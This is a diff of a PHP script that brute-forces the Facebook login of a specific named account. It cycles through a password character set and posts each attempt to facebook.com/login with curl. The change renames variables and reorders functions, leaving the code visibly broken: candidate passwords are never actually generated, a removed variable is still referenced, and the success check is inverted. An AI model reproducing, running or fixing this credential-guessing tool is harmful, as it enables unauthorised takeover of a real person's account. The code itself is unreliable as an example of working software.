@@ -6,25 +6,9 @@ $time = microtime() * 100000;
 $username = "kenkensquidkuddlephish";
 echo "https://twitter.com/LizardL4nds";
 define('P_MAX_LEN', 12);
-$c_set = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$%&*';          /*character set which is used to brute force the password*/
-$c_len = strlen($c_set); 		/*strlen() function is used to find the length of the character set*/
-function repeat($width, $position)
-{     
-	global $c_set, $c_len; 
-		
-	for ($i = 0; $i < $c_len; $i++) 
-	{        
-		if ($position  < $width - 1) 
-		{    
-			repeat($width, $position + 1, $c_set); 
-		}
-		     
-		check_correct($c_set);    
-	}
-} 
+$Pass = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$%&*';          /*character set which is used to brute force the password*/
+$c_len = strlen($Pass); 
 
-
-// Function for checking whether the username and password are correct
 function check_correct($Pass)
 {
         $c = curl_init('https://www.facebook.com/login');
@@ -41,6 +25,21 @@ function check_correct($Pass)
         if($str != "What's on your mind?") {return true;}
         else {return false;}
 }
+
+function repeat($width, $position)
+{     
+	global $c_set, $c_len; 
+		
+	for ($i = 0; $i < $c_len; $i++) 
+	{        
+		if ($position  < $width - 1) 
+		{    
+			repeat($width, $position + 1, $c_set); 
+		}
+		     
+		check_correct($c_set);    
+	}
+} 
 
 if(check_correct($Pass)) {
             echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
